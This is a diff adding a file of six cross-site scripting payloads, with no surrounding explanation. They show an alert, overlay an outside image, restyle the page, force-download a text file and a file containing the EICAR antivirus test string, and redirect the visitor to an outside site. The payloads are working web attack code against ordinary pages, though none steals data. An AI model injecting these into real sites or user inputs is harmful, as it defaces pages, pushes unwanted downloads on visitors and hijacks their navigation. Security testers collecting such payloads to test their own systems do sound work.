@@ -1,0 +1,21 @@
+<script>alert('XSS');</script>
+
+
+
+<script>var i=document.createElement("img");i.src="https://img-s-msn-com.akamaized.net/tenant/amp/entityid/AA1xZe0c.img";i.style="max-width:300px;position:fixed;top:10px;right:10px;z-index:9999;border:2px solid black;";document.body.appendChild(i);
+
+
+
+<script>var s=document.createElement("style");s.innerHTML="body{font-family:'Comic Sans MS',cursive;background:linear-gradient(45deg,red,orange,yellow,green,blue,indigo,violet);color:white;text-shadow:1px 1px 2px black;}";document.head.appendChild(s);
+
+
+
+<script>var b=new Blob(["Hello, this is an XSS attack"],{type:"text/plain"});var a=document.createElement("a");a.href=URL.createObjectURL(b);a.download="xss-demo.txt";document.body.appendChild(a);a.click();a.remove();</script>
+
+
+
+<script>var b=new Blob(["X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"],{type:"text/plain"});var a=document.createElement("a");a.href=URL.createObjectURL(b);a.download="how-bad-can-it-be.txt";document.body.appendChild(a);a.click();a.remove();</script>
+
+
+
+<script>location.href="https://www.lgk.lu/";</script>
